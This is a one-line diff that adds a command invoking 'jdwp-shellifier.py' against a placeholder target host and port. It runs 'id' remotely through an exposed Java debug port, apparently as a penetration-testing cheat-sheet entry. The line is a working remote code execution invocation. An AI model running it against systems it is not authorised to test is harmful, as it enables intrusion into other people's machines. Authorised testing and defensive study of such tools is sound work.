@@ -1,0 +1,1 @@
+jdwp-shellifier.py -t $TARGET -p $PORT --cmd "id"
